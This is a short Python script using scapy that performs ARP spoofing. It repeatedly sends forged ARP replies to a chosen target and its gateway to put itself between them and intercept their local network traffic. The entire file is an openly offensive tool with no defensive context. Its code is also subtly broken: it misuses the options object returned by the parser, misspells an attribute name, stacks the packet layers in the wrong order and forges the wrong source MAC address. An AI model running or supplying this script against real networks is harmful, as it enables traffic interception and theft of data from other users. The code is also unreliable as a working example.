
import scapy.all as sc
import optparse
import time
def get_arguments():
    par=optparse.OptionParser()
    par.add_option("-t","--target",dest="target_ip" ,help="target IP")
    par.add_option("-r", "--router", dest="getway_ip", help="getway  IP")
    opt=par.parse_args()
    if not opt.target_ip:
        par.error("[-] plese enter ip of target")
    if not opt.getwat_ip:
        par.error("[-] please enter ip of getway")
    return opt
opt=get_arguments()
spoof_ip=opt.getway_ip
target_ip=opt.target_ip
def get_macaddress(ip):
    arp_requst=sc.ARP(pdst=ip)
    arp_broadcast=sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_requst_bro=arp_requst/arp_broadcast
    anw=sc.srp(arp_requst_bro,timeout=1,verbose=False)[0]
    return anw[0][1].hwsrc
def spoof(targer_ip,spoof_ip):
    targer_mac=get_macaddress(targer_ip)
    spoof_mac=get_macaddress(spoof_ip)
    aro_response=sc.ARP(op=2,pdst=targer_ip,hwdst=targer_mac,psrc=spoof_ip,hwsrc=spoof_mac)
    sc.send(aro_response,verbose=False)
try:
    while True:
        time.sleep(2)
        spoof(target_ip,spoof_ip)
        spoof(spoof_ip,target_ip)
        print("start spoofing")
except KeyboardInterrupt:
    print("exit")



